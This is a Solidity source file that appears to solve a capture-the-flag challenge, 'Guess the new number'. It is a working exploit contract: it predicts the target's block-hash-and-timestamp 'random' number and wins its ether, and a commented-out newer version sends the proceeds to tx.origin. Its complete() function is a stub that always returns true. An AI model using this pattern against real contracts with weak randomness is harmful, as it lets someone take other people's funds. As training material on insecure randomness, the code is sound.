 pragma solidity ^0.4.21;

import "./GuessTheNewNumber.sol";

contract GuessNewAnswer{
    GuessTheNewNumber challenge;
    function GuessNewAnswer(address _challenge) public payable {
        require(msg.value == 1 ether);
        challenge = GuessTheNewNumber(_challenge);
    }

    function solve() public payable {
        // (msg.sender).transfer(1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        // (msg.sender).transfer(address(this).balance);
        // challenge.guess(answer);
        challenge.guess.value(1 ether)(answer);

    }
    function complete() public pure returns(bool){
        return true;
    }

    // function complete() public view returns(bool){
    //     // GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(_challenge);
    //     return challenge.isComplete();
    // }

} 

// pragma solidity ^0.7.3;

// interface IGuessTheNewNumberChallenge {
//     function isComplete() external view returns (bool);

//     function guess(uint8 n) external payable;
// }

// contract GuessNewAnswer {
//     IGuessTheNewNumberChallenge public challenge;
    
//     constructor (address challengeAddress) {
//         challenge = IGuessTheNewNumberChallenge(challengeAddress);
//     }

//     function attack() external payable {
//       // simulate the same what the challenge contract does
//       require(address(this).balance >= 1 ether, "not enough funds");
//       uint8 answer = uint8(uint256(
//         keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
//       ));
//       challenge.guess{value: 1 ether}(answer);

//       require(challenge.isComplete(), "challenge not completed");
//       // return all of it to EOA
//       tx.origin.transfer(address(this).balance);
//     }

//     receive() external payable {}
// }